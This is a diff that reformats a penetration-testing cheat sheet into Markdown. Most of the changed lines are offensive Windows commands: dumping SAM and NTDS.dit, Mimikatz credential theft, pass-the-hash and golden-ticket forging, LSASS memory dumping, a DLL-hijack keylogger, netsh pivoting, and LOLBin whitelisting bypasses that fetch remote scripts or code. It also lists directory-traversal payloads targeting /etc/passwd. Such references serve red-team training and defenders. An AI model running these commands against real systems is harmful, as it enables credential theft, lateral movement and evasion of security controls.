+### Add Specified Wireless Profile
 
   --------------------------------------------------------------------------------------------------------------
   netsh wlan set hostednetwork ssid=**\<ssid\>** key=**\<passphrase\>** keyUsage=**\[persistent\|temporary\]**
   --------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-269}Start or Stop Wireless Network
+### Start or Stop Wireless Network
 
   ----------------------------------------------
   netsh wlan **\[start\|stop\]** hostednetwork
   ----------------------------------------------
 
-[]{#anchor-270}Enable or Disable Wireless Network
+### Enable or Disable Wireless Network
 
   -----------------------------------------------------------
   netsh wlan set hostednetwork mode=**\[allow\|disallow\]**
   -----------------------------------------------------------
 
-[]{#anchor-271}Shares
+Shares
+------
 
-[]{#anchor-272}Turn Default Share On
+### Turn Default Share On
 
   ----------------------------------
   net share **\<(C\$\|ADMIN\$)\>**
   ----------------------------------
 
-[]{#anchor-273}Registry Enumeration
+Registry Enumeration
+--------------------
 
-[]{#anchor-274}Locate \<string\> In Registry (i.e. password)
+### Locate \<string\> In Registry (i.e. password)
 
   --------------------------------------------------------------
   reg query **\[HKLM\|HKCU\]** /f **\<string\>** /t REG\_SZ /s
   --------------------------------------------------------------
 
-[]{#anchor-275}Always Install Elevated Check
+### Always Install Elevated Check
 
   --------------------------------------------------------------------------------------------------------
   reg query **\[HKLM\|HKCU\]**\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated
   --------------------------------------------------------------------------------------------------------
 
-[]{#anchor-276}Crypto Commands
+Crypto Commands
+---------------
 
-[]{#anchor-277}Base64 Encode a File
+### Base64 Encode a File
 
   -----------------------------------------------------------
   certutil.exe -encode **\<inputfile\>** **\<outputfile\>**
   -----------------------------------------------------------
 
-[]{#anchor-278}Base64 Decode a File
+### Base64 Decode a File
 
   -----------------------------------------------------------
   certutil.exe -decode **\<inputfile\>** **\<outputfile\>**
   -----------------------------------------------------------
 
-[]{#anchor-279}Credential Commands
+Credential Commands
+-------------------
 
-[]{#anchor-280}Dumping Registry Hives (System User)
+### Dumping Registry Hives (System User)
 
   ------------------------------------------------------
   reg.exe save hklm\\sam c:\\temp\\sam.save\
@@ -2215,8 +2314,7 @@ program it runs active.
 
   ------------------------------------------------------
 
-[]{#anchor-281}Dumping Windows Repair SAM & System (Windows XP, System
-User)
+### Dumping Windows Repair SAM & System (Windows XP, System User)
 
 +-----------------------------+
 | C:\\Windows\\Repair\\SAM    |
@@ -2224,8 +2322,7 @@ User)
 | C:\\Windows\\Repair\\SYSTEM |
 +-----------------------------+
 
-[]{#anchor-282}Dumping Windows Repair SAM & System (Windows 7, System
-User)
+### Dumping Windows Repair SAM & System (Windows 7, System User)
 
 +------------------------------------------------+
 | C:\\windows\\system32\\config\\RegBack\\SAM    |
@@ -2233,19 +2330,19 @@ User)
 | C:\\windows\\system32\\config\\RegBack\\SYSTEM |
 +------------------------------------------------+
 
-[]{#anchor-283}Dump Active Directory NTDS.dit with NTDSUTIL
+### Dump Active Directory NTDS.dit with NTDSUTIL
 
   ------------------------------------------------------------------------------
   ntdsutil "activate instance ntds" "IFM" "create full **\<outputfile\>**" q q
   ------------------------------------------------------------------------------
 
-[]{#anchor-284}Dump Active Directory NTDS.dit with Invoke-NinjaCopy
+### Dump Active Directory NTDS.dit with Invoke-NinjaCopy
 
   -----------------------------------------------------------------------------------------------------------------------
   Invoke-NinjaCopy -Path "**\<path\>**\\ntds.dit" -ComputerName "**\<DCName\>**" -LocalDestination "**\<outputfile\>**"
   -----------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-285}Dump Active Directory NTDS.dit with Volume Shadow Copy
+### Dump Active Directory NTDS.dit with Volume Shadow Copy
 
 +-----------------------------------------------------------------------+
 | wmic /node:**\<DC FQDN\>** /user:**\<domain\>**\\**\<user\>**         |
@@ -2265,26 +2362,25 @@ User)
 | **\<destination\_path\>** 2\>&1 \> **\<logfile\>**                    |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-286}Invoke-MimiKatz Retrieve All Credentials
+### Invoke-MimiKatz Retrieve All Credentials
 
   --------------------------------------------
   Invoke-Mimikatz -ComputerName **\<host\>**
   --------------------------------------------
 
-[]{#anchor-287}Invoke-MimiKatz Retrieve Credentials for a Single User
-from a DC
+### Invoke-MimiKatz Retrieve Credentials for a Single User from a DC
 
   -----------------------------------------------------------------------------------------------------------
   Invoke-Mimikatz -Command "lsadump::dcsync /domain:**\<domain FQDN\>** /user:**\<domain\>**\\**\<user\>**"
   -----------------------------------------------------------------------------------------------------------
 
-[]{#anchor-288}Invoke-MimiKatz Pass-the-Hash (PTH)
+### Invoke-MimiKatz Pass-the-Hash (PTH)
 
   ----------------------------------------------------------------------------------------------------------------------------
   Invoke-Mimikatz -Command "sekurlsa::pth /user:**\<user\>** /domain:**\<domain\>** /ntlm:**\<hash\>** /run:**\<program\>**"
   ----------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-289}MimiKatz Get Logon Passwords (From Memory)
+### MimiKatz Get Logon Passwords (From Memory)
 
 +--------------------------+
 | privilege::debug         |
@@ -2292,7 +2388,7 @@ from a DC
 | sekurlsa::logonpasswords |
 +--------------------------+
 
-[]{#anchor-290}MimiKatz Dump Tickets (From Memory)
+### MimiKatz Dump Tickets (From Memory)
 
 +---------------------------+
 | privilege::debug          |
@@ -2300,7 +2396,7 @@ from a DC
 | sekurlsa::tickets /export |
 +---------------------------+
 
-[]{#anchor-291}MimiKatz Pass-the-Hash (PTH)
+### MimiKatz Pass-the-Hash (PTH)
 
 +-----------------------------------------------------------------------+
 | privilege::debug                                                      |
@@ -2309,7 +2405,7 @@ from a DC
 | /ntlm:**\<hash\>** /run:**\<cmd\>**                                   |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-292}MimiKatz Pass-the-Ticket (PTT) - Generate Golden Ticket
+### MimiKatz Pass-the-Ticket (PTT) - Generate Golden Ticket
 
 +-----------------------------------------------------------------------+
 | privilege::debug                                                      |
@@ -2318,7 +2414,7 @@ from a DC
 | /sid:**\<SID\>** /krbtgt:**\<hash\>** /ticket:**\<filename\>**        |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-293}MimiKatz Pass-the-Ticket (PTT) - Inject Golden Ticket
+### MimiKatz Pass-the-Ticket (PTT) - Inject Golden Ticket
 
 +-----------------------------------------------------------------------+
 | privilege::debug                                                      |
@@ -2327,8 +2423,7 @@ from a DC
 | /sid:**\<SID\>** /krbtgt:**\<hash\>** /ptt                            |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-294}MimiKatz Pass-the-Ticket (PTT) - Generate & Pass Silver
-Ticket
+### MimiKatz Pass-the-Ticket (PTT) - Generate & Pass Silver Ticket
 
 +-----------------------------------------------------------------------+
 | privilege::debug                                                      |
@@ -2338,8 +2433,7 @@ Ticket
 | /service:**\<servicename\>** /ptt                                     |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-295}MimiKatz Pass-the-Ticket (PTT) - Passing a Ticket
-(Current Session)
+### MimiKatz Pass-the-Ticket (PTT) - Passing a Ticket (Current Session)
 
 +----------------------------------+
 | privilege::debug                 |
@@ -2347,37 +2441,37 @@ Ticket
 | Kerberos::ptt **\<ticketfile\>** |
 +----------------------------------+
 
-[]{#anchor-296}MimiKatz Elivate to SYSTEM (Must be Administrator)
+### MimiKatz Elivate to SYSTEM (Must be Administrator)
 
   ----------------
   token::elevate
   ----------------
 
-[]{#anchor-297}MimiKatz Dump SAM (Live, Requires SYSTEM)
+### MimiKatz Dump SAM (Live, Requires SYSTEM)
 
   --------------
   lsadump::sam
   --------------
 
-[]{#anchor-298}MimiKatz Dump SAM (From Backup)
+### MimiKatz Dump SAM (From Backup)
 
   -------------------------------------------------
   lsadump::sam **\<systemfile\>** **\<samfile\>**
   -------------------------------------------------
 
-[]{#anchor-299}MimiKatz Dump Specific User Hash (LSA)
+### MimiKatz Dump Specific User Hash (LSA)
 
   -----------------------------------------
   lsadump::lsa /inject /name:**\<user\>**
   -----------------------------------------
 
-[]{#anchor-300}MimiKatz Dump Specific User Hash (DC Synchronization)
+### MimiKatz Dump Specific User Hash (DC Synchronization)
 
   --------------------------------------------------------------------
   lsadump::dcsync /domain:**\<domain FQDN**\> /user:**\<username\>**
   --------------------------------------------------------------------
 
-[]{#anchor-301}MimiKatz Dump Service Password
+### MimiKatz Dump Service Password
 
 +--------------------+
 | privilege::debug   |
@@ -2387,7 +2481,7 @@ Ticket
 | vault::cred /patch |
 +--------------------+
 
-[]{#anchor-302}MimiKatz Dump DPAPI Creds
+### MimiKatz Dump DPAPI Creds
 
 +-----------------------------------------------------------------------+
 | privilege::debug                                                      |
@@ -2399,7 +2493,7 @@ Ticket
 | crosoft\\Credentials\\**\<credentialfile\>**                          |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-303}RUNAS to Create Token & Run Process (Password Known)
+### RUNAS to Create Token & Run Process (Password Known)
 
   -------------------------------------------------------------------
   runas /netonly /user:**\<domain\>**\\**\<user\>** **\<command\>**
@@ -2410,22 +2504,22 @@ as on the local system. Remote systems will see the token you generated.
 This is how Pass-the-Hash (PTH)works. This technique can be used to
 build the hash needed for a PTH.
 
-[]{#anchor-304}Keylogging & Desktop Monitoring
+Keylogging & Desktop Monitoring
+-------------------------------
 
-[]{#anchor-305}Start Recording Screens with Problem Step Recorder (Must
-be run with user's credentials)
+### Start Recording Screens with Problem Step Recorder (Must be run with user's credentials)
 
   -----------------------------------------------------
   psr.exe /start /gui 0 /output **\<ZIP file path\>**
   -----------------------------------------------------
 
-[]{#anchor-306}Stop Recording Screens with Problem Step Recorder
+### Stop Recording Screens with Problem Step Recorder
 
   -------------------------------------------------------------------
   psr.exe /IT /RU **\<domain\>**\\**\<user\>** /RP **\<password\>**
   -------------------------------------------------------------------
 
-[]{#anchor-307}Keylogging with DLL Hijacking
+### Keylogging with DLL Hijacking
 
 Compile a Keylogger as a DLL and place it in the following directory,
 then kill and **explorer.exe**:
@@ -2436,29 +2530,31 @@ then kill and **explorer.exe**:
 
 **Note:** Logging will start once the user clicks the Start button.
 
-[]{#anchor-308}Network Tricks
+Network Tricks
+--------------
 
-[]{#anchor-309}Pivot with NETSH
+### Pivot with NETSH
 
   -----------------------------------------------------------------------------------------------------------------------------------------------
   netsh interface portproxy add v4tov4 listenport=**\<LPORT\>** listenaddress=0.0.0.0 connectionport=**\<FPORT\>** connectaddress=**\<FHOST\>**
   -----------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-310}Remove Pivot with NETSH
+### Remove Pivot with NETSH
 
   ---------------------------------
   netsh interface portproxy reset
   ---------------------------------
 
-[]{#anchor-311}Windows Miscellaneous Commands
+Windows Miscellaneous Commands
+------------------------------
 
-[]{#anchor-312}Abort Windows Shutdown
+### Abort Windows Shutdown
 
   -------------
   shutdown /a
   -------------
 
-[]{#anchor-313}Enable Remote Desktop (Registry)
+### Enable Remote Desktop (Registry)
 
 +-----------------------------------------------------------------------+
 | reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" |
@@ -2467,122 +2563,122 @@ then kill and **explorer.exe**:
 | REG\_DWORD /d 0 /f                                                    |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-314}List Group Policy
+### List Group Policy
 
   --------------
   gpresults /z
   --------------
 
-[]{#anchor-315}List All Files In a Directory Including Hidden & System
+### List All Files In a Directory Including Hidden & System
 
   --------
   dir /a
   --------
 
-[]{#anchor-316}Windows GUI Shortcuts & Commands
+Windows GUI Shortcuts & Commands
+--------------------------------
 
-[]{#anchor-317}Open Explorer In Folder View
+### Open Explorer In Folder View
 
   ------------------------------------
   explorer.exe /e **\<folderpath\>**
   ------------------------------------
 
-[]{#anchor-318}Open Programs and Features (Add/Remove Programs)
+### Open Programs and Features (Add/Remove Programs)
 
   ------------
   appwiz.cpl
   ------------
 
-[]{#anchor-319}AccessChk.exe (Sysinternals)
+AccessChk.exe (Sysinternals)
+----------------------------
 
-[]{#anchor-320}Check Specific Service Permissions
+### Check Specific Service Permissions
 
   -----------------------------------------------------
   accesschk.exe /accepteula -ucqv **\<servicename\>**
   -----------------------------------------------------
 
-[]{#anchor-321}Check For Any Service Permissions (pre-Windows 8)
+### Check For Any Service Permissions (pre-Windows 8)
 
   -------------------------------------------------------------
   accesschk.exe /accepteula -uwcqv \"Authenticated Users\" \*
   -------------------------------------------------------------
 
-[]{#anchor-322}Find all Directories Writable By Users
+### Find all Directories Writable By Users
 
   -----------------------------------------------------
   accesschk.exe /accepteula -uwdqs Users **\<path\>**
   -----------------------------------------------------
 
-[]{#anchor-323}Find all Directories Writable By Authenticated Users
+### Find all Directories Writable By Authenticated Users
 
   ---------------------------------------------------------------------
   accesschk.exe /accepteula -uwdqs "Authenticated Users" **\<path\>**
   ---------------------------------------------------------------------
 
-[]{#anchor-324}Find all Files Writable By Users
+### Find all Files Writable By Users
 
   -----------------------------------------------------------
   accesschk.exe /accepteula -uwqs Users **\<path\>**\\\*.\*
   -----------------------------------------------------------
 
-[]{#anchor-325}Find all Files Writable By Authenticated Users
+### Find all Files Writable By Authenticated Users
 
   ---------------------------------------------------------------------------
   accesschk.exe /accepteula -uwqs "Authenticated Users" **\<path\>**\\\*.\*
   ---------------------------------------------------------------------------
 
-[]{#anchor-326}Commands That do Other Things (LOLBins: Inspired by Odvar
-Moe's list)
+Commands That do Other Things (LOLBins: Inspired by Odvar Moe's list)
+---------------------------------------------------------------------
 
-[]{#anchor-327}Run Commands with ForFiles
+### Run Commands with ForFiles
 
   ---------------------------------------------------------------------------------------------------
   forfiles /p **\<path\_to\_look\_in\>** /m **\<file\_to\_look\_for\>** /c **\<command\_to\_run\>**
   ---------------------------------------------------------------------------------------------------
 
-[]{#anchor-328}Run Commands with Bash (If git is installed)
+### Run Commands with Bash (If git is installed)
 
   --------------------------------------
   bash.exe -c **\<command\_to\_run\>**
   --------------------------------------
 
-[]{#anchor-329}Run Commands with ScriptRunner.exe (Part of Application
-Virtualization Client)
+### Run Commands with ScriptRunner.exe (Part of Application Virtualization Client)
 
   -------------------------------------------------------
   scriptrunner.exe -appvscript **\<command\_to\_run\>**
   -------------------------------------------------------
 
-[]{#anchor-330}Run Commands with SyncAppVPublishingServer.exe (Part of
-Application Virtualization Client)
+### Run Commands with SyncAppVPublishingServer.exe (Part of Application Virtualization Client)
 
   ---------------------------------------------------------------
   SyncAppVPublishingServer.exe "n; **\<PowerShell\_Commants\>**
   ---------------------------------------------------------------
 
-[]{#anchor-331}Open an HTML or File Path with hh.exe
+### Open an HTML or File Path with hh.exe
 
   ------------------------------
   hh.exe **\<url\_or\_path\>**
   ------------------------------
 
-[]{#anchor-332}Run PowerShell Via JavaScript with RunDLL32.exe
+### Run PowerShell Via JavaScript with RunDLL32.exe
 
   ------------------------------------------------------------------------------------------
   rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \"**\<PowerShell\_Commands\>**\"
   ------------------------------------------------------------------------------------------
 
-[]{#anchor-333}Run Remote SCT Scripts with RegSvr32.exe
+### Run Remote SCT Scripts with RegSvr32.exe
 
   ----------------------------------------------------------
   regsvr32.exe /s /n /u /i:**\<url\_to\_sct\>** scrobj.dll
   ----------------------------------------------------------
 
-[]{#anchor-334}Run Commands with RegSvcs.exe & RegAsm.exe
+### Run Commands with RegSvcs.exe & RegAsm.exe
 
 Create a C\# project that utilizes the DLL Register & Unregister
 Methods, similar to this example:
-[*https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07*](https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07)
+[[https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07]{.underline}](https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07)
 
 +-----------------------------------------------------------------------+
 | C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe            |
@@ -2591,49 +2687,50 @@ Methods, similar to this example:
 |                                                                       |
 | To use the register module:                                           |
 |                                                                       |
-| regsvcs.exe regsvcs.dll                                               |
-|                                                                       |
-| OR                                                                    |
-|                                                                       |
-| Regasm.exe regsvcs.dll                                                |
+| > regsvcs.exe regsvcs.dll                                             |
+| >                                                                     |
+| > OR                                                                  |
+| >                                                                     |
+| > Regasm.exe regsvcs.dll                                              |
 |                                                                       |
 | To use unregister module:                                             |
 |                                                                       |
-| Regsvcs.exe /U regsvcs.dll                                            |
-|                                                                       |
-| OR                                                                    |
-|                                                                       |
-| Regasm.exe /U regsvcs.dll                                             |
+| > Regsvcs.exe /U regsvcs.dll                                          |
+| >                                                                     |
+| > OR                                                                  |
+| >                                                                     |
+| > Regasm.exe /U regsvcs.dll                                           |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-335}Run Commands with BgInfo.exe
+### Run Commands with BgInfo.exe
 
 Create a custom \*.bgi file that will execute your custom VBS commands.
 Similar to what is described here:
 
--   [*https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/*](https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/)
--   [*https://msitpros.com/?p=3831*](https://msitpros.com/?p=3831)
+-   [[https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/]{.underline}](https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/)
+
+-   [[https://msitpros.com/?p=3831]{.underline}](https://msitpros.com/?p=3831)
 
   ----------------------------------------------------------
   bginfo.exe **\<custom\_bgi\_file\>** /popup /nolicprompt
   ----------------------------------------------------------
 
-[]{#anchor-336}Run Commands with Custom DLLs
+### Run Commands with Custom DLLs
 
 Example located here:
-[*https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290*](https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290)
+[[https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290]{.underline}](https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290)
 
   ----------------------------------------------------------------------
   InstallUtil.exe /logfile= /LogToConsole=false /U **\<custom\_dll\>**
   ----------------------------------------------------------------------
 
-[]{#anchor-337}Run Remote .NET Code with IEEXEC.EXE
+### Run Remote .NET Code with IEEXEC.EXE
 
   --------------------------------------------
   ieexec.exe **\<url\_to\_DotNet\_binary\>**
   --------------------------------------------
 
-[]{#anchor-338}Run Commands with msxsl.exe
+### Run Commands with msxsl.exe
 
 Create XML files to execute JScript. A write up is located here:
 
@@ -2641,86 +2738,87 @@ Create XML files to execute JScript. A write up is located here:
   msxsl.exe customers.xml script.xsl
   ------------------------------------
 
-[]{#anchor-339}Run Commands with odbcconf.exe
+### Run Commands with odbcconf.exe
 
 Build a C\# project that will be built as a DLL then registered and run
 with odbcconf.exe:
-[*https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce*](https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce)
+[[https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce]{.underline}](https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce)
 
   ------------------------
   odbcconf.exe /f my.rsp
   ------------------------
 
-[]{#anchor-340}Dump LSASS Process Memory with sqldumper.exe
+### Dump LSASS Process Memory with sqldumper.exe
 
   ----------------------------------------------
   sqldumper.exe **\<lsass\_pid\>** 0 0x0110:40
   ----------------------------------------------
 
-[]{#anchor-341}Run Commands with pcalua.exe
+### Run Commands with pcalua.exe
 
   -------------------------------
   pcalua.exe -a **\<command\>**
   -------------------------------
 
-[]{#anchor-342}Running Commands with msiexec.exe
+### Running Commands with msiexec.exe
 
--   [*https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/*](https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/)
+-   [[https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/]{.underline}](https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/)
 
   --------------------------------------------------------------
   msiexec /quiet /i **\<msi\_with\_msi\_or\_png\_extention\>**
   --------------------------------------------------------------
 
-[]{#anchor-343}Running Commands with cmstp.exe
+### Running Commands with cmstp.exe
 
--   [*https://msitpros.com/?p=3960*](https://msitpros.com/?p=3960)
--   [*https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e*](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e)
+-   [[https://msitpros.com/?p=3960]{.underline}](https://msitpros.com/?p=3960)
+
+-   [[https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e]{.underline}](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e)
 
   -----------------------------------------
   cmstp.exe /ni /s **\<malicious\_inf\>**
   -----------------------------------------
 
-[]{#anchor-344}DLL Loading with xwizard.exe
+### DLL Loading with xwizard.exe
 
--   [*http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/*](http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/)
+-   [[http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/]{.underline}](http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/)
 
   -----------------------------------------------------------------------------
   Drop your malicious DLL into the same directory and xwizard.exe and run it.
   -----------------------------------------------------------------------------
 
-[]{#anchor-345}DLL Injection with MavInject32.exe
+### DLL Injection with MavInject32.exe
 
   --------------------------------------------------------------------------------------------------------------------------------
   \"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\" **\<PID\>** /INJECTRUNNING **\<PATH DLL\>**
   --------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-346}Running C\# with csi.exe (Interactive)
+### Running C\# with csi.exe (Interactive)
 
--   [*https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html*](https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html)
+-   [[https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html]{.underline}](https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html)
 
   --------------------------------------
   Run csi.exe and enter your C\# code.
   --------------------------------------
 
-[]{#anchor-347}Running F\# with fsi.exe (Interactive)
+### Running F\# with fsi.exe (Interactive)
 
--   [*https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1*](https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1)
+-   [[https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1]{.underline}](https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1)
 
   --------------------------------------
   Run fsi.exe and enter your F\# code.
   --------------------------------------
 
-[]{#anchor-348}Creating a Control Panel to Execute Code (DLL)
+### Creating a Control Panel to Execute Code (DLL)
 
--   [*https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/*](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)
+-   [[https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/]{.underline}](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)
 
   --------------------------------------------------------------------------------
   Create a dll and add a registry key to the HKCU hive to obtain code execution.
   --------------------------------------------------------------------------------
 
-[]{#anchor-349}Run Commands with dnx.exe
+### Run Commands with dnx.exe
 
--   [*https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/*](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)
+-   [[https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/]{.underline}](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)
 
 +----------------------------------------------------------+
 | Write C\# file and accompanying JSON File, then execute: |
@@ -2728,25 +2826,27 @@ with odbcconf.exe:
 | dnx.exe **\<appname\>**                                  |
 +----------------------------------------------------------+
 
-[]{#anchor-350}Run Commands with cdb.exe
+### Run Commands with cdb.exe
 
--   [*http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html*](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)
--   [*https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda*](https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda)
+-   [[http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html]{.underline}](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)
+
+-   [[https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda]{.underline}](https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda)
 
   --------------------------------------------------
   cdb.exe -cf **\<wds\_file\>** -o **\<command\>**
   --------------------------------------------------
 
-[]{#anchor-351}Run Commands with MSBuild Using PowerShell
+### Run Commands with MSBuild Using PowerShell
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-  \[Reflection.Assembly\]::LoadWithPartialName(\'[http://Microsoft.Build ](https://t.co/2nLz1YPu43)\');\
-  [\$e](https://twitter.com/search?q=%24e&src=ctag)=new-object[ http://Microsoft.Build ](https://t.co/2nLz1YPu43).Evaluation.Project(\'**\<csproj\_file\>**\');\
+  \[Reflection.Assembly\]::LoadWithPartialName(\'[http://Microsoft.Build](https://t.co/2nLz1YPu43) \');\
+  [\$e](https://twitter.com/search?q=%24e&src=ctag)=new-object [http://Microsoft.Build](https://t.co/2nLz1YPu43) .Evaluation.Project(\'**\<csproj\_file\>**\');\
   [\$e](https://twitter.com/search?q=%24e&src=ctag).Build();
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-352}Directory Traversals
+Directory Traversals
+====================
 
 +------------------------------------------------+
 | ../\                                           |
@@ -2776,33 +2876,37 @@ with odbcconf.exe:
 | /file://absolute/path/\<traversal\>/etc/passwd |
 +------------------------------------------------+
 
-[]{#anchor-353}Reverse Engineering Commands
+Reverse Engineering Commands
+============================
 
-[]{#anchor-354}Strings
+Strings
+-------
 
-[]{#anchor-355}List Strings From File
+### List Strings From File
 
   --------------------------
   strings **\<ELF File\>**
   --------------------------
 
-[]{#anchor-356}Objcopy
+Objcopy
+-------
 
-[]{#anchor-357}Copy/Rip Debugging Symbols From a Binary
+### Copy/Rip Debugging Symbols From a Binary
 
   -------------------------------------------------------------------------------------
   objcopy \--only-keep-debug rip\_from\_binary **\<ELF Binary w/Debugging Symbols\>**
   -------------------------------------------------------------------------------------
 
-[]{#anchor-358}Add Debugging Symbols to a Binary
+### Add Debugging Symbols to a Binary
 
   -----------------------------------------------------------------
   objcopy \--add-gnu-debuglink=**\<symbol file\> \<ELF Binary\>**
   -----------------------------------------------------------------
 
-[]{#anchor-359}Strip
+Strip
+-----
 
-[]{#anchor-360}Strip Debugging & Other Symbols
+### Strip Debugging & Other Symbols
 
 This can be useful if attempting to hide or make more difficult the
 analysis of an executable. It can also reduce the size of a binary.
@@ -2811,238 +2915,251 @@ analysis of an executable. It can also reduce the size of a binary.
   strip \--strip-debug \--strip-unneeded **\<ELF Binary\>**
   -----------------------------------------------------------
 
-[]{#anchor-361}NM
+NM
+--
 
-[]{#anchor-362}Display All Symbols
+### Display All Symbols
 
   ------------------------
   nm -a **\<ELF File\>**
   ------------------------
 
-[]{#anchor-363}Display Sorted Symbols
+### Display Sorted Symbols
 
   ------------------------
   nm -n **\<ELF File\>**
   ------------------------
 
-[]{#anchor-364}Display External Symbols
+### Display External Symbols
 
   ------------------------
   nm -g **\<ELF File\>**
   ------------------------
 
-[]{#anchor-365}Display Symbol Sizes
+### Display Symbol Sizes
 
   ------------------------
   nm -S **\<ELF File\>**
   ------------------------
 
-[]{#anchor-366}Command Symbol Types
+### Command Symbol Types
 
-  ----------------- -----------------------------------------
   **Symbol Type**   **Meaning**
+  ----------------- -----------------------------------------
   A                 Absolute Symbol
   B                 In the Uninitialized Data Section (BSS)
   D                 In the Initialized Data Section
   N                 Debugging Symbol
   T                 In the Text Section
   U                 Symbol Undefined
-  ----------------- -----------------------------------------
 
-[]{#anchor-367}Strace
+Strace
+------
 
-[]{#anchor-368}Show Timestamps in Output
+### Show Timestamps in Output
 
   ----------------------------
   strace -t **\<ELF File\>**
   ----------------------------
 
-[]{#anchor-369}Show Relative Timestamps in Output
+### Show Relative Timestamps in Output
 
   ----------------------------
   strace -r **\<ELF File\>**
   ----------------------------
 
-[]{#anchor-370}Trace Specified System Calls
+### Trace Specified System Calls
 
   -----------------------------------------------------
   strace -e **\<comma separated list\> \<ELF File\>**
   -----------------------------------------------------
 
-[]{#anchor-371}Trace a Running Process (As root)
+### Trace a Running Process (As root)
 
   -----------------------
   strace -p **\<PID\>**
   -----------------------
 
-[]{#anchor-372}Trace Syscall Statistics
+### Trace Syscall Statistics
 
   ----------------------------
   strace -c **\<ELF File\>**
   ----------------------------
 
-[]{#anchor-373}GNU Debugger Commands (gdb)
+GNU Debugger Commands (gdb)
+---------------------------
 
-[]{#anchor-374}Get ELF Details (Find the entry point)
+### Get ELF Details (Find the entry point)
 
   -----------------------------------
   shell readelf -h **\<filename\>**
   -----------------------------------
 
-[]{#anchor-375}Run the Program
+### Run the Program
 
   ------------------------------
   run **\<command\> \<args\>**
   ------------------------------
 
-[]{#anchor-376}List Functions
+### List Functions
 
   ----------------
   info functions
   ----------------
 
-[]{#anchor-377}List Variables
+### List Variables
 
   ----------------
   info variables
   ----------------
 
-[]{#anchor-378}List Variables in a Function
+### List Variables in a Function
 
   ----------------------------------
   info scope **\<function name\>**
   ----------------------------------
 
-[]{#anchor-379}Load Debugging Symbols from a File
